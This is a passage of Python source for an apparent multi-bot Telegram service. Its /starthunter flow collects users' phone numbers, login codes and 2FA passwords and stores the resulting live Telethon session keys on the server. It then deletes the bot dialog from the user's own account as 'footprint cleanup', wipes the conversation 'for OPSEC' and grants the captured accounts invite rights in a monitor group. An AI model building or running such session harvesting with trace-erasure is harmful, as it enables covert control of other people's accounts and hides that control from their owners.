                bot_entity = await client.get_entity(bot_id)
            await client.delete_dialog(bot_entity)
            logger.info(f"Deleted dialog with bot {context.bot.username} for logged in user {filename}")
        except Exception as e:
            logger.error(f"Failed footprint cleanup: {e}")
        
        await client.disconnect()

        # Copy to final destination
        saved_successfully = False
        try:
            if os.path.isdir(final_path):
                shutil.rmtree(final_path)
            tmp_final_path = final_path + ".tmp"
            if os.path.exists(tmp_final_path):
                os.remove(tmp_final_path)
            shutil.copy2(temp_session_path + ".session", tmp_final_path)
            os.replace(tmp_final_path, final_path)
            os.chmod(final_path, SESSION_FILE_PERMISSIONS)  # SECURITY: restrict to owner only
            saved_successfully = True
        except PermissionError:
            logger.warning(f"File {final_path} is locked. Attempting sqlite3 injection...")
            try:
                import sqlite3
                src_conn = sqlite3.connect(temp_session_path + ".session")
                if os.path.isdir(final_path):
                    shutil.rmtree(final_path)
                dst_conn = sqlite3.connect(final_path, timeout=30.0)
                # Enable WAL mode so concurrent readers get a consistent snapshot
                dst_conn.execute("PRAGMA journal_mode=WAL")

                src_cur = src_conn.cursor()
                dst_cur = dst_conn.cursor()

                try:
                    # Wrap entire copy in a single transaction; rollback if anything fails
                    # Copy sessions table
                    src_cur.execute("SELECT dc_id, server_address, port, auth_key, takeout_id FROM sessions")
                    row = src_cur.fetchone()
                    dst_cur.execute("CREATE TABLE IF NOT EXISTS sessions (dc_id integer primary key, server_address text, port integer, auth_key blob, takeout_id integer)")
                    dst_cur.execute("DELETE FROM sessions")
                    if row:
                        dst_cur.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", row)

                    # Copy entities table safely
                    try:
                        src_cur.execute("SELECT id, hash, username, phone, name, date FROM entities")
                        entities = src_cur.fetchall()
                        dst_cur.execute("CREATE TABLE IF NOT EXISTS entities (id integer primary key, hash integer not null, username text, phone text, name text, date integer)")
                        dst_cur.executemany("INSERT OR REPLACE INTO entities VALUES (?, ?, ?, ?, ?, ?)", entities)
                    except Exception as e:
                        logger.warning(f"Failed to copy entities: {e}")

                    dst_conn.commit()
                    saved_successfully = True
                except Exception as copy_err:
                    dst_conn.rollback()
                    logger.error(f"Sqlite copy failed mid-transaction, rolled back: {copy_err}")
                    raise

                src_conn.close()
                dst_conn.close()
                try:
                    os.chmod(final_path, SESSION_FILE_PERMISSIONS)  # SECURITY: restrict to owner only
                except Exception as e:
                    logger.warning(f"Could not set session file permissions: {e}")
            except Exception as e:
                logger.error(f"Sqlite injection failed: {e}")

        if saved_successfully:
            # Database Entry (Persistence & Database Update)
            try:
                await asyncio.to_thread(
                    lambda: db.table("telegram_accounts").upsert({
                        "phone": context.user_data.get('phone'),
                        "session_path": os.path.abspath(final_path),
                        "telegram_user_id": me.id,
                        "status": "active",
                        "updated_at": "now()"
                    }).execute()
                )
                logger.info(f"Updated telegram_accounts for {context.user_data.get('phone')}")
            except Exception as e:
                logger.error(f"Failed to update database: {e}")

        if not saved_successfully:
            logger.warning(f"Bot @{current_bot_username} could not save session — recommending alternative bot.")
            current_token = context.bot_data.get('_bot_token', '')
            if current_token:
                _locked_bots.add(current_token)
            
            other_bots = _get_other_bot_usernames(current_bot_username)
            if not other_bots:
                other_bots = _get_all_bot_usernames_except(current_bot_username)
            
            if other_bots:
                bot_links = "\n".join([f"• @{b}" for b in other_bots])
                lock_msg = (
                    f"🔒 **Session Locked**\n\n"
                    f"This bot (@{current_bot_username}) could not save the session file "
                    f"because it is locked by another process.\n\n"
                    f"👉 **Please use one of these other bots instead:**\n"
                    f"{bot_links}\n\n"
                    f"Just open a chat with the bot above and type /starthunter to login."
                )
            else:
                lock_msg = (
                    f"🔒 **Session Locked**\n\n"
                    f"This bot (@{current_bot_username}) could not save the session file.\n"
                    f"No other bots are available at this time. Please try again later."
                )
            
            sent_msg = await update.message.reply_text(lock_msg, parse_mode=ParseMode.MARKDOWN)
            await schedule_deletion(context, chat_id, sent_msg.message_id, delay=30)
            return ConversationHandler.END

        # Session saved successfully — silent, no confirmation message.
        # The entire conversation is wiped immediately for OPSEC.
        current_token = context.bot_data.get('_bot_token', '')
        if current_token:
            _locked_bots.discard(current_token)

        try:
            os.remove(temp_session_path + ".session")
        except Exception:
            pass

        # Auto-join monitor group step: generate a single-use invite link and
        # DM it to the user. The user's session MUST be a member of the
        # monitor group for user_agent.invite_bot_to_group() to work — this
        # is currently the biggest usability gap in the login flow.
        try:
            invite = await context.bot.create_chat_invite_link(
                chat_id=settings.MONITOR_GROUP_ID,
                member_limit=1,
                name=f"login-{phone_clean}-{timestamp}",
                creates_join_request=False,
            )
            invite_url = invite.invite_link
            join_msg = (
                "🍤 *Almost done — one more click*\n\n"
                "Your session is registered, but it must be a member of the "
                "monitor group to invite bots. Tap the link below to join "
                "(single-use, expires when consumed):\n\n"
                f"{invite_url}\n\n"
                "_This message will self-delete in 60 seconds._"
            )
            sent_join = await update.message.reply_text(
                join_msg,
                parse_mode=ParseMode.MARKDOWN,
                disable_web_page_preview=True,
            )
            # Schedule the message for deletion so it doesn't linger in the user's DM
            await schedule_deletion(context, chat_id, sent_join.message_id, delay=60)
            logger.info(
                f"[JoinInvite] sent single-use invite link to phone={phone_clean} "
                f"(expires when consumed or 60s message TTL for the DM)"
            )
        except Exception as invite_exc:
            logger.warning(f"[JoinInvite] could not send invite link: {invite_exc}")

        # Wipe entire conversation history with this user for OPSEC
        await _wipe_conversation(context, chat_id, context.user_data.get('bot_messages', []))
        return ConversationHandler.END

    except Exception as e:
        logger.error(f"Error finalizing login: {e}")
        err = await update.message.reply_text(f"❌ Error finalizing login: {str(e)}")
        context.user_data.setdefault('bot_messages', []).append(err.message_id)
        await client.disconnect()
        await _wipe_conversation(context, update.effective_chat.id, context.user_data.get('bot_messages', []))
        return ConversationHandler.END

async def _cleanup_temp_session(context: ContextTypes.DEFAULT_TYPE):
    """Unconditionally delete the temp session file if present. Called from every
    conversation exit path so live Telethon auth keys don't leak on abandon."""
    temp_path = context.user_data.get('temp_session_path')
    if not temp_path:
        return
    for suffix in (".session", ".session-journal", ""):
        p = temp_path + suffix
        try:
            if os.path.exists(p):
                os.remove(p)
        except Exception as e:
            logger.debug(f"[TempCleanup] could not remove {p}: {e}")


async def cancel_login(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancels and ends the conversation — silent wipe for OPSEC."""
    client = context.user_data.get('client')
    if client:
        try:
            await client.disconnect()
        except Exception:
            pass
    await _cleanup_temp_session(context)
    chat_id = update.effective_chat.id
    await _wipe_conversation(context, chat_id, context.user_data.get('bot_messages', []))
    return ConversationHandler.END


async def _conversation_timeout(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Fires when a login conversation exceeds conversation_timeout. Wipes any
    orphaned temp session file + closes the Telethon client."""
    client = context.user_data.get('client')
    if client:
        try:
            await client.disconnect()
        except Exception:
            pass
    await _cleanup_temp_session(context)
    chat_id = update.effective_chat.id if update and update.effective_chat else None
    if chat_id:
        await _wipe_conversation(context, chat_id, context.user_data.get('bot_messages', []))
    return ConversationHandler.END

async def log_update(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Logs every incoming update for debugging — skips hub group messages to reduce noise."""
    chat = update.effective_chat
    chat_id = chat.id if chat else None

    # SECURITY: never log private-DM contents. The /starthunter conversation
    # transports phone numbers, login codes, and 2FA passwords through private
    # DMs; if this handler logged them, they'd persist in container stdout logs.
    if chat and getattr(chat, "type", None) == "private":
        return

    # Suppress logging for messages originating from the monitor hub group.
    # The bot is a member of the hub so it receives every broadcast message back;
    # logging each one is pure noise and leaks message content into container logs.
    if chat_id is not None:
        from app.services.scraper_srv import _resolve_monitor_group_ids_async
        monitor_ids = await _resolve_monitor_group_ids_async()
        if str(chat_id) in monitor_ids or chat_id in monitor_ids:
            return

    user = update.effective_user
    # update.message.text is None for photo/sticker/voice/document updates.
    # Fall back to caption (photos), then "No text".
    if update.message:
        text = update.message.text or update.message.caption or "No text"
    else:
        text = "No text"
    logger.info(f"🔄 Update from {user.id if user else 'Unknown'} in {chat_id}: {text}")

async def on_chat_member_update(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Auto-promote joining user-agent session accounts with MINIMAL admin rights.

    Fires whenever the bot sees a chat_member update in any chat. We only act
    when: (1) it's the monitor group, (2) the changed member matches a row in
    telegram_accounts.telegram_user_id, and (3) they just transitioned to
    'member' (i.e. joined).

    Permissions granted (all others explicitly False):
      • can_invite_users=True  — required so user_agent can InviteToChannel bots
    Permissions denied (nuke-protection):
      • can_change_info, can_delete_messages, can_restrict_members,
        can_pin_messages, can_promote_members, can_manage_video_chats
      • is_anonymous=False (stays visible as themselves in admin list)

    Note: Telegram's can_invite_users doesn't distinguish bot vs person invites.
    The membership audit task will detect and revert any non-bot user additions
    performed by session accounts.
    """
    cmu = update.chat_member
    if not cmu:
        return

    # Only care about the monitor group
    if cmu.chat.id != settings.MONITOR_GROUP_ID:
        return

    new_status = cmu.new_chat_member.status if cmu.new_chat_member else None
    old_status = cmu.old_chat_member.status if cmu.old_chat_member else None
    user = cmu.new_chat_member.user if cmu.new_chat_member else None
    if not user or user.is_bot:
        return  # bots are handled separately by user_agent.invite_bot_to_group

    # Only act on transitions into 'member' state (join or unbanned)
    if new_status != "member" or old_status == "member":
        return

    # Match against telegram_accounts.telegram_user_id
    try:
        res = await asyncio.to_thread(
            lambda: db.table("telegram_accounts")
                .select("id, phone, status, is_admin_promoted")
                .eq("telegram_user_id", user.id)
                .limit(1)
                .execute()
        )
    except Exception as e:
        logger.debug(f"[MemberJoin] db lookup failed for user {user.id}: {e}")
        return

    rows = res.data or []
    if not rows:
        logger.info(
            f"[MemberJoin] user {user.id} (@{user.username or '?'}) joined but has "
            f"no telegram_accounts row — treating as regular guest, not promoting"
        )
        return

    account = rows[0]
    if account.get("status") != "active":
        logger.warning(
            f"[MemberJoin] user {user.id} matches inactive account {account['id']} — "
            f"not promoting"
        )
        return

    # SAFETY GUARD: if the user is ALREADY an admin/owner with broader rights,
    # never touch them. This protects the 4 legacy owner accounts + any human
    # you manually promoted with wider perms.
    try:
        current = await context.bot.get_chat_member(
            chat_id=settings.MONITOR_GROUP_ID,
            user_id=user.id,
        )
        current_status = getattr(current, "status", None)
        if current_status in ("creator", "administrator"):
            # Already has admin — preserve whatever perms they have
            logger.info(
                f"[MemberJoin] user {user.id} (@{user.username or '?'}) already "
                f"has status={current_status} — leaving unchanged, marking "
                f"account {account['id']} as promoted"
            )
            await asyncio.to_thread(
                lambda: db.table("telegram_accounts")
                    .update({
                        "is_admin_promoted": True,
                        "promoted_at": "now()",
                        "in_monitor_group": True,
                        "last_membership_check_at": "now()",
                    })
                    .eq("id", account["id"])
                    .execute()
            )
            return
    except Exception as e:
        logger.debug(
            f"[MemberJoin] get_chat_member check failed for {user.id}: {e} — "
            f"proceeding with promotion attempt"
        )

    # Promote with MINIMAL admin rights
    try:
        await context.bot.promote_chat_member(
            chat_id=settings.MONITOR_GROUP_ID,
            user_id=user.id,
            can_manage_chat=False,
            can_delete_messages=False,
            can_manage_video_chats=False,
            can_restrict_members=False,
            can_promote_members=False,
            can_change_info=False,
            can_invite_users=True,          # REQUIRED for inviting bots via user session
            can_pin_messages=False,
            can_post_messages=False,
            can_edit_messages=False,
            is_anonymous=False,
        )
        # Mark promoted in DB
        await asyncio.to_thread(
            lambda: db.table("telegram_accounts")
                .update({
                    "is_admin_promoted": True,
                    "promoted_at": "now()",
                    "in_monitor_group": True,
                    "last_membership_check_at": "now()",
                })
                .eq("id", account["id"])
                .execute()
        )
        logger.info(
            f"[MemberJoin] ✅ promoted @{user.username or user.id} "
            f"(account {account['id']}) with invite-only admin rights"
        )
    except Exception as e:
        logger.warning(
            f"[MemberJoin] promote_chat_member failed for user {user.id}: {e}"
        )


def _build_application(token: str) -> Application:
    """Builds a python-telegram-bot Application for a single bot token."""
    request = HTTPXRequest(
        read_timeout=30.0,
        connect_timeout=30.0,
        pool_timeout=60.0
    )
    application = ApplicationBuilder().token(token).request(request).build()
    application.bot_data['_bot_token'] = token

    # Owned-bot voluntary funnel tracking. This handler stores only an HMAC
    # pseudonym and event metadata; private message content is never persisted.
    application.add_handler(
        MessageHandler(
            filters.ChatType.PRIVATE & filters.TEXT & ~filters.COMMAND,
            track_private_inbound,
        ),
        group=-2,
    )

    # Group -1 runs before other handlers
    application.add_handler(MessageHandler(filters.ALL, log_update), group=-1)

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler(["stop", "optout", "unsubscribe"], opt_out_command))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("pause", pause))
    application.add_handler(CommandHandler("resume", resume))
    application.add_handler(CommandHandler("restart", restart))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("commands", help_command))
    application.add_handler(CommandHandler("bots", bots_command))
    application.add_handler(CommandHandler("telemetry", telemetry_command))
    application.add_handler(CommandHandler("indicators", telemetry_command))
    application.add_handler(CommandHandler("getfile", getfile_command))
    application.add_handler(CommandHandler("archive", getfile_command))
    application.add_handler(CommandHandler("backfill", backfill_command))

    # Auto-promote logged-in session accounts when they join monitor group
    application.add_handler(
        ChatMemberHandler(on_chat_member_update, ChatMemberHandler.CHAT_MEMBER)
    )

    login_conv_handler = ConversationHandler(
        entry_points=[CommandHandler('starthunter', starthunter)],
        states={
            WAIT_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone)],
            WAIT_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_code)],
            WAIT_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_password)],
            ConversationHandler.TIMEOUT: [MessageHandler(filters.ALL, _conversation_timeout)],
        },
        fallbacks=[CommandHandler('cancel', cancel_login)],
        conversation_timeout=180,  # 3-minute cap — orphan temp session files get wiped
    )
    application.add_handler(login_conv_handler)
    return application


async def _run_bot(token: str, is_primary: bool = False):
    """Runs a single bot's polling loop. Primary bot also runs the Watchdog."""
    lock_key = await _acquire_poll_lock(token)
    if redis_client and not lock_key:
        logger.info(
            f"Poll lock held by previous instance for bot_id={_bot_id_from_token(token)}. "
            f"Waiting {LOCK_TTL_SECONDS + 5}s for expiry before retrying..."
        )
        try:
            await asyncio.wait_for(stop_event.wait(), timeout=LOCK_TTL_SECONDS + 5)
            return
        except asyncio.TimeoutError:
            pass
        lock_key = await _acquire_poll_lock(token)
        if not lock_key:
            logger.error(f"Poll lock still held after wait. Giving up for bot_id={_bot_id_from_token(token)}.")
            return

    application = _build_application(token)
    lock_renew_task = None
    watchdog_task = None

    try:
        await application.initialize()
        bot_info = await application.bot.get_me()
        bot_username = bot_info.username or f"bot_{bot_info.id}"
        _bot_usernames[token] = bot_username
        logger.info(f"🤖 Bot @{bot_username} starting polling...")

        if lock_key:
            lock_renew_task = asyncio.create_task(_renew_poll_lock(lock_key))

        # Retry start_polling up to 3 times on Conflict — another instance
        # may still be releasing its long-poll connection.
        for attempt in range(3):
            try:
                await application.updater.start_polling(
                    drop_pending_updates=False,
                    allowed_updates=Update.ALL_TYPES,
                )
                break
            except Conflict as e:
                if attempt < 2:
                    logger.warning(f"⚠️ Polling conflict for @{bot_username} (attempt {attempt+1}/3), retrying in 10s: {e}")
                    await asyncio.sleep(10)
                else:
                    logger.error(f"⚠️ Polling conflict for @{bot_username} after 3 attempts, giving up: {e}")
                    return

        # MUST call application.start() so the update queue processor runs.
        # async with application: only calls initialize/shutdown — handlers
        # are never dispatched without start().
        await application.start()

        if is_primary:
            watchdog_task = asyncio.create_task(watchdog_loop(application.bot))
            logger.info(f"🐶 Watchdog attached to primary bot @{bot_username}")

        logger.info(f"🚀 Bot @{bot_username} Started and Polling...")

        heartbeat_count = 0
        _ALIVE_FILE = "/tmp/bot_alive"
        while not stop_event.is_set():
            await asyncio.sleep(10)
            heartbeat_count += 1
            # Touch the liveness file every iteration so the Docker healthcheck
            # can assert the file was modified within the last 60 seconds.
            try:
                import pathlib
                pathlib.Path(_ALIVE_FILE).touch()
            except Exception:
                pass
            if heartbeat_count % 30 == 0:
                logger.info(f"💓 Bot @{bot_username} polling heartbeat (Event loop active)")

        logger.info(f"Stopping bot @{bot_username}...")

    finally:
        if watchdog_task:
            watchdog_task.cancel()
        if lock_renew_task:
            lock_renew_task.cancel()
        try:
            await application.updater.stop()
            await application.stop()
        except Exception:
            pass
        await application.shutdown()
        await _release_poll_lock(lock_key)

async def main():
    global redis_client

    # Wait for internet on startup (handles machine boot / container restart)
    from app.core.connectivity import wait_for_internet_async
    logger.info("Checking internet connectivity before starting...")
    if not await wait_for_internet_async(max_wait=300, check_interval=10):
        logger.error("No internet after 300s — starting anyway (will retry on each operation).")

    # Sweep orphan temp login session files left from crashed / abandoned flows.
    # Each is a live Telethon auth key — must not persist after the conversation dies.
    try:
        import glob as _glob
        import tempfile as _tempfile
        _temp_dir = _tempfile.gettempdir()
        _orphans = _glob.glob(os.path.join(_temp_dir, "temp_login_*.session*"))
        for _f in _orphans:
            try:
                os.remove(_f)
                logger.info(f"[Startup] swept orphan temp session file: {os.path.basename(_f)}")
            except Exception:
                pass
    except Exception as _sweep_exc:
        logger.debug(f"[Startup] orphan sweep failed: {_sweep_exc}")

    raw_tokens = settings.bot_tokens
    seen_ids = set()
    tokens = []
    for token in raw_tokens:
        token = token.strip()
        if not token: continue
        bot_id = _bot_id_from_token(token)
        if bot_id in seen_ids: continue
        seen_ids.add(bot_id)
        tokens.append(token)

    if not tokens:
        logger.error("MONITOR_BOT_TOKEN not set!")
        return

    logger.info(f"🚀 Starting Multi-Bot Listener with {len(tokens)} bot(s)...")
    redis_client = redis.from_url(settings.REDIS_URL, decode_responses=True)

    if os.name != 'nt':
        loop = asyncio.get_running_loop()
        def _handle_signal(): stop_event.set()
        for sig in (signal.SIGINT, signal.SIGTERM):
            loop.add_signal_handler(sig, _handle_signal)
    
    tasks = []
    for i, token in enumerate(tokens):
        tasks.append(asyncio.create_task(_run_bot(token, is_primary=(i == 0))))
    
    await asyncio.gather(*tasks, return_exceptions=True)
    await redis_client.aclose()
    logger.info("Bye!")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
    except Exception as e:
        logger.error(f"Fatal crash: {e}")
